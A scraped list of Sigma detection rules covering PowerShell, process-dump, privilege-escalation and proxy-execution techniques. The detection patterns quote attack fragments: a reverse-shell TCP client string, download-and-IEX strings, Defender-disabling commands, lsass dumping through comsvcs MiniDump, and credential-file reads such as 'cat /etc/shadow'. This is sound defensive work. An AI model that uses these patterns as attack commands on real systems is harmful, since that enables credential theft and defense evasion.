<li><a href="#">title:Powershell Profile.ps1 Modification id: b5b78988-486d-4a80-b991-930eff3ff8bf status: test description: Detects a change in profile.ps1 of the Powershell profile author: HieuTT35 references: - date: 2019/10/24 modified: 2021/11/27 logsource: product: windows category: file_event detection: target1: TargetFilename|contains|all: - '\My Documents\PowerShell\' - '\profile.ps1' target2: TargetFilename|contains|all: - 'C:\Windows\System32\WindowsPowerShell\v1.0\' - '\profile.ps1' condition: target1 or target2 falsepositives: - System administrator create Powershell profile manually level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1546.013 
<li><a href="#">title:PowerShell PSAttack id: b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5 status: experimental description: Detects the use of PSAttack PowerShell hack tool references: - tags: - attack.execution - attack.t1059.001 author: Sean Metcalf (source), Florian Roth (rule) date: 2017/03/05 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: 'PS ATTACK!!!' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:PowerShell Remote Session Creation id: a0edd39f-a0c6-4c17-8141-261f958e8d8f status: experimental description: | Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system references: - - author: frack113 date: 2022/01/06 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - New-PSSession - '-ComputerName ' condition: selection falsepositives: - Legitimate administrative script level: medium tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Powershell Reverse Shell Connection id: edc2f8ae-2412-4dfd-b9d5-0c57727e70be status: experimental description: Detects the Nishang Invoke-PowerShellTcpOneLine reverse shell author: FPT.EagleEye, wagga references: - - date: 2021/03/03 modified: 2021/06/27 tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' CommandLine|contains: 'new-object system.net.sockets.tcpclient' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Administrative might use this function for checking network connectivity level: high 
<li><a href="#">title:PowerShell Rundll32 Remote Thread Creation id: 99b97608-3e21-4bfe-8217-2a127c396a0e status: experimental description: Detects PowerShell remote thread creation in Rundll32.exe author: Florian Roth references: - date: 2018/06/25 modified: 2021/11/12 logsource: product: windows category: create_remote_thread detection: selection: SourceImage|endswith: '\powershell.exe' TargetImage|endswith: '\rundll32.exe' condition: selection tags: - attack.defense_evasion - attack.execution - attack.t1218.011 - attack.t1059.001 falsepositives: - Unknown level: high 
<li><a href="#">title:PowerShell SAM Copy id: 1af57a4b-460a-4738-9034-db68b880c665 description: Detects suspicious PowerShell scripts accessing SAM hives status: experimental references: - author: Florian Roth date: 2021/07/29 modified: 2021/12/02 tags: - attack.credential_access - attack.t1003.002 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains|all: - '\HarddiskVolumeShadowCopy' - 'ystem32\config\sam' selection_2: CommandLine|contains: - 'Copy-Item' - 'cp $_.' - 'cpi $_.' - 'copy $_.' - '.File]::Copy(' condition: all of selection* falsepositives: - Some rare backup scenarios - PowerShell scripts fixing HiveNightmare / SeriousSAM ACLs level: high 
<li><a href="#">title:PowerShell Script Run in AppData id: ac175779-025a-4f12-98b0-acdaeb77ea85 status: experimental description: Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder references: - - tags: - attack.execution - attack.t1059.001 author: Florian Roth, Jonhnathan Ribeiro, oscd.community date: 2019/01/09 modified: 2021/11/28 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - 'powershell.exe' - '\powershell' selection2: CommandLine|contains|all: - '/c ' - '\AppData\' CommandLine|contains: - 'Local\' - 'Roaming\' condition: selection1 and selection2 falsepositives: - Administrative scripts level: medium 
<li><a href="#">title:PowerShell Scripts Installed as Services id: 2a926e6a-4b81-4011-8a96-e36cc8c04302 related: - id: a2e5019d-a658-4c6a-92bf-7197b54e2cae type: derived description: Detects powershell script installed as a Service status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2021/09/21 references: - tags: - attack.execution - attack.t1569.002 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains: - 'powershell' - 'pwsh' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:PowerShell Scripts Installed as Services id: a2e5019d-a658-4c6a-92bf-7197b54e2cae description: Detects powershell script installed as a Service status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2021/11/30 references: - tags: - attack.execution - attack.t1569.002 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains: - 'powershell' - 'pwsh' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:PowerShell Scripts Run by a Services id: 46deb5e1-28c9-4905-b2df-51cdcc9e6073 related: - id: a2e5019d-a658-4c6a-92bf-7197b54e2cae type: derived description: Detects powershell script installed as a Service status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2021/09/21 references: - tags: - attack.execution - attack.t1569.002 logsource: product: windows category: driver_load detection: selection: ImageLoaded|contains: - 'powershell' - 'pwsh' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:PowerShell ShellCode id: 16b37b70-6fcf-4814-a092-c36bd3aafcbd status: experimental description: Detects Base64 encoded Shellcode references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 - attack.execution - attack.t1059.001 author: David Ledbetter (shellcode), Florian Roth (rule) date: 2018/11/17 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: 'AAAAYInlM' selection2: ScriptBlockText|contains: - 'OiCAAAAYInlM' - 'OiJAAAAYInlM' condition: selection and selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:Powershell Store File In Alternate Data Stream id: a699b30e-d010-46c8-bbd1-ee2e26765fe9 status: experimental author: frack113 date: 2021/09/02 modified: 2021/10/16 description: Storing files in Alternate Data Stream (ADS) similar to Astaroth malware. references: - tags: - attack.defense_evasion - attack.t1564.004 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_compspec: ScriptBlockText|contains|all: - 'Start-Process' - '-FilePath "$env:comspec" ' - '-ArgumentList ' - '>' condition: selection_compspec falsepositives: - Unknown level: medium 
<li><a href="#">title:Powershell Suspicious Win32_PnPEntity id: b26647de-4feb-4283-af6b-6117661283c5 status: experimental author: frack113 date: 2021/08/23 modified: 2021/10/16 description: Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. references: - tags: - attack.discovery - attack.t1120 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection: ScriptBlockText|contains: Win32_PnPEntity condition: selection falsepositives: - Admin script level: low 
<li><a href="#">title:Powershell Timestomp id: c6438007-e081-42ce-9483-b067fbef33c3 status: experimental author: frack113 date: 2021/08/03 modified: 2021/10/16 description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. references: - - tags: - attack.defense_evasion - attack.t1070.006 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_ioc: ScriptBlockText|contains: - '.CreationTime =' - '.LastWriteTime =' - '.LastAccessTime =' - '[IO.File]::SetCreationTime' - '[IO.File]::SetLastAccessTime' - '[IO.File]::SetLastWriteTime' condition: selection_ioc falsepositives: - Legitimate admin script level: medium 
<li><a href="#">title:Powershell Trigger Profiles by Add_Content id: 05b3e303-faf0-4f4a-9b30-46cc13e69152 status: experimental author: frack113 date: 2021/08/18 modified: 2021/10/16 description: Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. references: - tags: - attack.privilege_escalation - attack.t1546.013 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection: ScriptBlockText|contains|all: - 'Add-Content' - '$profile' - '-Value' ScriptBlockText|contains: - 'Start-Process' - '""' #cleanup action condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Powershell Used To Disable Windows Defender AV Security Monitoring id: a7ee1722-c3c5-aeff-3212-c777e4733217 status: experimental description: Detects attackers attempting to disable Windows Defender using Powershell author: 'ok @securonix invrep-de, oscd.community, frack113' date: 2020/10/12 modified: 2021/06/07 references: - - - tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' CommandLine|contains: - '-DisableBehaviorMonitoring $true' - '-DisableRuntimeMonitoring $true' selection_tamper_cmd_stop: CommandLine|contains|all: - sc - stop - WinDefend selection_tamper_cmd_disabled: CommandLine|contains|all: - sc - config - WinDefend - 'start=disabled' condition: 1 of selection* falsepositives: - 'Minimal, for some older versions of dev tools, such as pycharm, developers were known to sometimes disable Windows Defender to improve performance, but this generally is not considered a good security practice.' level: high 
<li><a href="#">title:PowerShell Web Download and Execution id: 85b0b087-eddf-4a2b-b033-d771fa2b9775 status: experimental description: Detects suspicious ways to download files or content using PowerShell author: Florian Roth date: 2022/03/24 tags: - attack.t1546.013 references: - logsource: product: windows category: process_creation detection: selection: CommandLine|contains: - '.DownloadString(' - '.DownloadFile(' execution: CommandLine|contains: - 'IEX(' - 'IEX (' - 'I`EX' - 'IE`X' - 'I`E`X' - ' | IEX' - '|IEX ' - 'Invoke-Execution' - ';iex $' condition: selection and execution falsepositives: - Scripts or tools that download files and execute them level: high 
<li><a href="#">title:PowerShell Web Download id: 6e897651-f157-4d8f-aaeb-df8151488385 status: experimental description: Detects suspicious ways to download files or content using PowerShell author: Florian Roth date: 2022/03/24 references: - logsource: product: windows category: process_creation detection: selection: # Marker CommandLine|contains: - '.DownloadString(' - '.DownloadFile(' condition: selection falsepositives: - Scripts or tools that download files level: medium 
<li><a href="#">title:Powershell WMI Persistence id: 9e07f6e7-83aa-45c6-998e-0af26efd0a85 status: experimental author: frack113 date: 2021/08/19 modified: 2021/10/16 description: Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. references: - - tags: - attack.privilege_escalation - attack.t1546.003 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_ioc: - ScriptBlockText|contains|all: - 'New-CimInstance ' - '-Namespace root/subscription ' - '-ClassName __EventFilter ' - '-Property ' #is a variable name - ScriptBlockText|contains|all: - 'New-CimInstance ' - '-Namespace root/subscription ' - '-ClassName CommandLineEventConsumer ' - '-Property ' #is a variable name condition: selection_ioc falsepositives: - Unknown level: medium 
<li><a href="#">title:PowerShell WMI Win32_Product Install MSI id: 91109523-17f0-4248-a800-f81d9e7c081d status: experimental description: Detects the execution of an MSI file using PowerShell and the WMI Win32_Product class author: frack113 date: 2022/04/24 references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Invoke-CimMethod ' - '-ClassName ' - 'Win32_Product ' - '-MethodName ' - '.msi' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218.007 
<li><a href="#">title:PowerShell Writing Startup Shortcuts id: 92fa78e7-4d39-45f1-91a3-8b23f3f1088d description: Attempts to detect PowerShell writing startup shortcuts. This procedure was highlighted in Red Canary Intel Insights Oct. 2021, "We frequently observe adversaries using PowerShell to write malicious .lnk files into the startup directory to establish persistence. Accordingly, this detection opportunity is likely to identify persistence mechanisms in multiple threats. In the context of Yellow Cockatoo, this persistence mechanism eventually launches the command-line script that leads to the installation of a malicious DLL" status: experimental references: - - tags: - attack.registry_run_keys_/_startup_folder - attack.t1547.001 date: 2021/10/24 author: Christopher Peacock '@securepeacock', SCYTHE level: high logsource: product: windows category: file_event detection: selection: Image|endswith: '\powershell.exe' TargetFilename|contains: '\start menu\programs\startup\' TargetFilename|endswith: '.lnk' condition: selection falsepositives: - Unknown - Depending on your environment accepted applications may leverage this at times. It is recomended to search for anomolies inidicative of malware. 
<li><a href="#">title:Powershell XML Execute Command id: 6c6c6282-7671-4fe9-a0ce-a2dcebdc342b status: experimental description: | Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code author: frack113 date: 2022/01/19 references: - logsource: product: windows category: ps_script detection: selection_xml: ScriptBlockText|contains|all: - New-Object - System.Xml.XmlDocument - .Load selection_exec: - IEX - Invoke-Expression condition: all of selection_* falsepositives: - Legitimate administrative script level: medium tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Powerup Write Hijack DLL id: 602a1f13-c640-4d73-b053-be9a2fa58b96 status: experimental description: Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation. In it's default mode, it builds a self deleting .bat file which executes malicious command. The detection rule relies on creation of the malicious bat file (debug.bat by default). references: - author: Subhash Popuri (@pbssubhash) date: 2021/08/21 tags: - attack.persistence - attack.privilege_escalation - attack.defense_evasion - attack.t1574.001 logsource: category: file_event product: windows detection: selection: Image|endswith: '\powershell.exe' TargetFilename|endswith: '.bat' condition: selection falsepositives: - Any powershell script that creates bat files # highly unlikely (untested) level: high 
<li><a href="#">title:Powerview Add-DomainObjectAcl DCSync AD Extend Right id: 2c99737c-585d-4431-b61a-c911d86ff32f description: backdooring domain object to grant the rights associated with DCSync to a regular user or machine account using Powerview\Add-DomainObjectAcl DCSync Extended Right cmdlet, will allow to re-obtain the pwd hashes of any user/computer status: experimental date: 2019/04/03 modified: 2022/05/10 author: Samir Bousseaden; Roberto Rodriguez @Cyb3rWard0g; oscd.community; Tim Shelton references: - - tags: - attack.persistence - attack.t1098 logsource: product: windows service: security detection: selection: EventID: 5136 AttributeLDAPDisplayName: 'ntSecurityDescriptor' AttributeValue|contains: - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' - '89e95b76-444d-4c62-991a-0facbeda640c' filter1: ObjectType: - 'dnsNode' - 'dnsZoneScope' condition: selection and not 1 of filter* falsepositives: - New Domain Controller computer account, check user SIDs within the value attribute of event 5136 and verify if it's a regular user or DC computer account. level: critical 
<li><a href="#">title:Prefetch File Deletion id: 0a1f9d29-6465-4776-b091-7f43b26e4c89 status: experimental description: Detects the deletion of a prefetch file (AntiForensic) level: high author: Cedric MAURUGEON date: 2021/09/29 modified: 2022/05/27 tags: - attack.defense_evasion - attack.t1070.004 logsource: product: windows category: file_delete detection: selection: TargetFilename|startswith: 'C:\Windows\Prefetch\' TargetFilename|endswith: '.pf' exception: Image: 'C:\windows\system32\svchost.exe' User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: selection and not exception falsepositives: - Unknown 
<li><a href="#">title:Print History File Contents id: d7821ff1-4527-4e33-9f84-d0d57fa2fb66 status: experimental description: Detects events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance author: Florian Roth references: - date: 2022/06/20 logsource: category: process_creation product: linux detection: selection: Image|endswith: '/cat' selection_history: - CommandLine|contains: - '/.bash_history' - '/.zsh_history' - CommandLine|endswith: '_history' condition: all of selection* falsepositives: - Legitimate administration activities level: medium tags: - attack.reconnaissance - attack.t1592.004 
<li><a href="#">title:PrintBrm ZIP Creation of Extraction id: cafeeba3-01da-4ab4-b6c4-a31b1d9730c7 status: experimental description: Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation. references: - author: frack113 date: 2022/05/02 logsource: product: windows category: process_creation detection: selection: Image|endswith: '\PrintBrm.exe' CommandLine|contains|all: - ' -f' - '.zip' condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1105 - attack.defense_evasion - attack.t1564.004 
<li><a href="#">title:PrinterNightmare Mimimkatz Driver Name id: ba6b9e43-1d45-4d3c-a504-1043a64c8469 status: experimental description: Detects static QMS 810 and mimikatz driver name used by Mimikatz as exploited in CVE-2021-1675 and CVE-2021-34527 references: - - - author: Markus Neis, @markus_neis, Florian Roth tags: - attack.execution - attack.t1204 - cve.2021.1675 - cve.2021.34527 date: 2021/07/04 modified: 2021/07/28 logsource: product: windows category: registry_event detection: selection: TargetObject|contains: - '\Control\Print\Environments\Windows x64\Drivers\Version-3\QMS 810\' - '\Control\Print\Environments\Windows x64\Drivers\Version-3\mimikatz' selection_alt: TargetObject|contains|all: - 'legitprinter' - '\Control\Print\Environments\Windows' selection_print: TargetObject|contains: - '\Control\Print\Environments' - '\CurrentVersion\Print\Printers' selection_kiwi: TargetObject|contains: - 'Gentil Kiwi' - 'mimikatz printer' - 'Kiwi Legit Printer' condition: selection or selection_alt or (selection_print and selection_kiwi) falsepositives: - Legitimate installation of printer driver QMS 810, Texas Instruments microLaser printer (unlikely) level: critical 
<li><a href="#">title:PrintNightmare Powershell Exploitation id: 6d3f1399-a81c-4409-aff3-1ecfe9330baf status: test description: Detects Commandlet name for PrintNightmare exploitation. date: 2021/08/09 modified: 2021/10/16 references: - author: Max Altgelt, Tobias Michalski logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection: ScriptBlockText|contains: Invoke-Nightmare condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1548 
<li><a href="#">title:Privilege Escalation Preparation id: 444ade84-c362-4260-b1f3-e45e20e1a905 status: test description: Detects suspicious shell commands indicating the information gathering phase as preparation for the Privilege Escalation. author: Patrick Bareiss references: - - date: 2019/04/05 modified: 2021/11/27 logsource: product: linux detection: keywords: # distribution type and kernel version - 'cat /etc/issue' - 'cat /etc/*-release' - 'cat /proc/version' - 'uname -a' - 'uname -mrs' - 'rpm -q kernel' - 'dmesg | grep Linux' - 'ls /boot | grep vmlinuz-' # environment variables - 'cat /etc/profile' - 'cat /etc/bashrc' - 'cat ~/.bash_profile' - 'cat ~/.bashrc' - 'cat ~/.bash_logout' # applications and services as root - 'ps -aux | grep root' - 'ps -ef | grep root' # scheduled tasks - 'crontab -l' - 'cat /etc/cron*' - 'cat /etc/cron.allow' - 'cat /etc/cron.deny' - 'cat /etc/crontab' # search for plain text user/passwords - 'grep -i user *' - 'grep -i pass *' # networking - 'ifconfig' - 'cat /etc/network/interfaces' - 'cat /etc/sysconfig/network' - 'cat /etc/resolv.conf' - 'cat /etc/networks' - 'iptables -L' - 'lsof -i' - 'netstat -antup' - 'netstat -antpx' - 'netstat -tulpn' - 'arp -e' - 'route' # sensitive files - 'cat /etc/passwd' - 'cat /etc/group' - 'cat /etc/shadow' # sticky bits - 'find / -perm -u=s' - 'find / -perm -g=s' - 'find / -perm -4000' - 'find / -perm -2000' timeframe: 30m condition: keywords falsepositives: - Troubleshooting on Linux Machines level: medium tags: - attack.execution - attack.t1059.004 
<li><a href="#">title:Procdump Evasion id: 79b06761-465f-4f88-9ef2-150e24d3d737 description: Detects uses of the SysInternals Procdump utility in which procdump or its output get renamed or a dump file is moved ot copied to a different name status: experimental references: - author: Florian Roth date: 2022/01/11 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - 'copy procdump' - 'move procdump' selection2: CommandLine|contains|all: - 'copy ' - '.dmp ' CommandLine|contains: - '2.dmp' - 'lsass' - 'out.dmp' selection3: CommandLine|contains: - 'copy lsass.exe_' # procdump default pattern e.g. lsass.exe_220111_085234.dmp - 'move lsass.exe_' # procdump default pattern e.g. lsass.exe_220111_085234.dmp condition: 1 of selection* falsepositives: - Cases in which procdump just gets copied to a different directory without any renaming level: high 
<li><a href="#">title:Procdump Usage id: 2e65275c-8288-4ab4-aeb7-6274f58b6b20 description: Detects uses of the SysInternals Procdump utility status: experimental references: - Internal Research author: Florian Roth date: 2021/08/16 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - '\procdump.exe' - '\procdump64.exe' selection2: CommandLine|contains|all: - ' -ma ' - '.exe' condition: selection1 or selection2 falsepositives: - Legitimate use of procdump by a developer or administrator level: medium 
<li><a href="#">title:Process Access via TrolleyExpress Exclusion id: 4c0aaedc-154c-4427-ada0-d80ef9c9deb6 status: experimental description: Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory author: Florian Roth references: - - date: 2022/02/10 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # We assume that the lsass.exe process has a process ID that's between 700 and 999 and the dumper uses just the PID as parameter - '\TrolleyExpress 7' - '\TrolleyExpress 8' - '\TrolleyExpress 9' - '\TrolleyExpress.exe 7' - '\TrolleyExpress.exe 8' - '\TrolleyExpress.exe 9' # Common dumpers - '\TrolleyExpress.exe -ma ' renamed: Image|endswith: '\TrolleyExpress.exe' filter_renamed: OriginalFileName|contains: 'CtxInstall' filter_empty: OriginalFileName: null condition: selection or ( renamed and not 1 of filter* ) fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.011 - attack.credential_access - attack.t1003.001 
<li><a href="#">title:Process Creation with Renamed BrowserCore.exe id: 8a4519e8-e64a-40b6-ae85-ba8ad2177559 status: experimental description: Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens) author: Max Altgelt date: 2022/06/02 references: - tags: - attack.t1528 - attack.t1036.003 logsource: category: process_creation product: windows detection: selection: OriginalFileName: BrowserCore.exe filter_realbrowsercore: Image|endswith: '\BrowserCore.exe' condition: selection and not 1 of filter* falsepositives: - Unknown level: high 
<li><a href="#">title:Process Discovery id: 4e2f5868-08d4-413d-899f-dc2f1508627b status: stable description: Detects process discovery commands author: Ã–mer GÃ¼nal, oscd.community date: 2020/10/06 modified: 2021/08/14 references: - logsource: product: linux category: process_creation detection: selection: Image|endswith: - '/ps' - '/top' condition: selection falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1057 
<li><a href="#">title:Process Dump via Comsvcs DLL id: 09e6d5c0-05b8-4ff8-9eeb-043046ec774c status: test description: Detects process memory dump via comsvcs.dll and rundll32 author: Modexp (idea) references: - - date: 2019/09/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: rundll_image: Image|endswith: '\rundll32.exe' rundll_ofn: OriginalFileName: 'RUNDLL32.EXE' selection: CommandLine|contains|all: - 'comsvcs' - 'MiniDump' #Matches MiniDump and MinidumpW - 'full' condition: (rundll_image or rundll_ofn) and selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.011 - attack.credential_access - attack.t1003.001 
<li><a href="#">title:Process Dump via RdrLeakDiag.exe id: edadb1e5-5919-4e4c-8462-a9e643b02c4b description: Detects a process memory dump performed by RdrLeakDiag.exe status: experimental level: high references: - author: Cedric MAURUGEON date: 2021/09/24 tags: - attack.credential_access - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: OriginalFileName: RdrLeakDiag.exe CommandLine|contains: fullmemdmp condition: selection falsepositives: - Unknown 
<li><a href="#">title:Process Dump via Rundll32 and Comsvcs.dll id: 646ea171-dded-4578-8a4d-65e9822892e3 description: Detects a process memory dump performed via ordinal function 24 in comsvcs.dll status: experimental references: - - - author: Florian Roth date: 2020/02/18 modified: 2021/12/08 tags: - attack.defense_evasion - attack.t1036 - attack.credential_access - car.2013-05-009 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection_comsvcs: CommandLine|contains: - 'comsvcs.dll' - 'rundll32' - '.dmp' selection_function: Commandline|contains: - '#24' - '#+24' - 'MiniDump' selection_full: CommandLine|contains: ' full' unique_selection: CommandLine|contains: '#-4294967272' # condition: all of selection* or unique_selection falsepositives: - Unlikely, because no one should dump the process memory in that way level: high 
<li><a href="#">title:Process Start From Suspicious Folder id: dca91cfd-d7ab-4c66-8da7-ee57d487b35b status: experimental description: Detects process start from rare or uncommon folders like temporary folder or folders that usually don't contain executable files references: - Malware sandbox results author: frack113 date: 2022/02/11 modified: 2022/06/04 logsource: category: process_creation product: windows detection: selection: Image|contains: - '\Desktop\' - '\Temp\' - '\Temporary Internet' filter_parent: - ParentImage: - 'C:\Windows\System32\cleanmgr.exe' - 'C:\Program Files (x86)\Microsoft Visual Studio\Installer\resources\app\ServiceHub\Services\Microsoft.VisualStudio.Setup.Service\BackgroundDownload.exe' - 'C:\Windows\System32\dxgiadaptercache.exe' - ParentImage|startswith: 'C:\Program Files (x86)\NVIDIA Corporation\' filter_other: Image|endswith: 'setup.exe' # the missing \ at the beginning is intended - to cover e.g. MySoftwareSetup.exe as well condition: selection and not 1 of filter* falsepositives: - Unknown level: low tags: - attack.execution - attack.t1204 
<li><a href="#">title:Processes Accessing the Microphone and Webcam id: 8cd538a4-62d5-4e83-810b-12d41e428d6e status: test description: Potential adversaries accessing the microphone and webcam in an endpoint. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - date: 2020/06/07 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 4657 - 4656 - 4663 ObjectName|contains: - '\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged' - '\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged' condition: selection falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1123 
<li><a href="#">title:ProcessHacker Privilege Elevation id: c4ff1eac-84ad-44dd-a6fb-d56a92fc43a9 description: Detects a ProcessHacker tool that elevated privileges to a very high level status: experimental references: - author: Florian Roth date: 2021/05/27 modified: 2021/11/30 tags: - attack.execution - attack.privilege_escalation - attack.t1543.003 - attack.t1569.002 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ServiceName|startswith: 'ProcessHacker' AccountName: 'LocalSystem' condition: selection falsepositives: - Unlikely level: high 
<li><a href="#">title:Program Executions in Suspicious Folders id: a39d7fa7-3fbd-4dc2-97e1-d87f546b1bbc status: test description: Detects program executions in suspicious non-program folders related to malware or hacking activity author: Florian Roth references: - Internal Research date: 2018/01/23 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'SYSCALL' exe|startswith: # Temporary folder - '/tmp/' # Web server - '/var/www/' # Standard - '/home/*/public_html/' # Per-user - '/usr/local/apache2/' # Classical Apache - '/usr/local/httpd/' # Old SuSE Linux 6.* Apache - '/var/apache/' # Solaris Apache - '/srv/www/' # SuSE Linux 9.* - '/home/httpd/html/' # Redhat 6 or older Apache - '/srv/http/' # ArchLinux standard - '/usr/share/nginx/html/' # ArchLinux nginx # Data dirs of typically exploited services (incomplete list) - '/var/lib/pgsql/data/' - '/usr/local/mysql/data/' - '/var/lib/mysql/' - '/var/vsftpd/' - '/etc/bind/' - '/var/named/' condition: selection falsepositives: - Admin activity (especially in /tmp folders) - Crazy web applications level: medium tags: - attack.t1587 - attack.t1584 - attack.resource_development 
<li><a href="#">title:Protected Storage Service Access id: 45545954-4016-43c6-855e-eae8f1c369dc status: test description: Detects access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/08/10 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5145 ShareName|contains: 'IPC' RelativeTargetName: 'protected_storage' condition: selection falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:ProtocolHandler.exe Downloaded Suspicious File id: 104cdb48-a7a8-4ca7-a453-32942c6e5dcb status: experimental author: frack113 date: 2021/07/13 description: Emulates attack via documents through protocol handler in Microsoft Office. On successful execution you should see Microsoft Word launch a blank file. references: - tags: - attack.defense_evasion - attack.t1218 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\protocolhandler.exe' CommandLine|contains|all: - '"ms-word' - '.docx"' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Proxy Execution Via Explorer.exe id: 9eb271b9-24ae-4cd4-9465-19cfc1047f3e status: test description: Attackers can use explorer.exe for evading defense mechanisms author: 'Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative' references: - date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \explorer.exe ParentImage|endswith: \cmd.exe CommandLine|contains: explorer.exe condition: selection falsepositives: - Legitimate explorer.exe run from cmd.exe level: low tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Proxy Execution via Wuauclt id: af77cf95-c469-471c-b6a0-946c685c4798 description: Detects the use of the Windows Update Client binary (wuauclt.exe) to proxy execute code. related: - id: ba1bb0cb-73da-42de-ad3a-de10c643a5d0 type: obsoletes - id: d7825193-b70a-48a4-b992-8b5b3015cc11 type: obsoletes status: experimental date: 2020/10/12 modified: 2021/05/10 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), Florian Roth, Sreeman, FPT.EagleEye Team tags: - attack.defense_evasion - attack.t1218 - attack.execution references: - - logsource: category: process_creation product: windows detection: selection_one: - Image|contains: wuauclt - OriginalFileName: wuauclt.exe selection_two: CommandLine|contains|all: - 'UpdateDeploymentProvider' - '.dll' - 'RunHandlerComServer' filter: CommandLine|contains: - ' /UpdateDeploymentProvider UpdateDeploymentProvider.dll ' - ' wuaueng.dll ' condition: selection_one and selection_two and not filter falsepositives: - Unknown level: high 
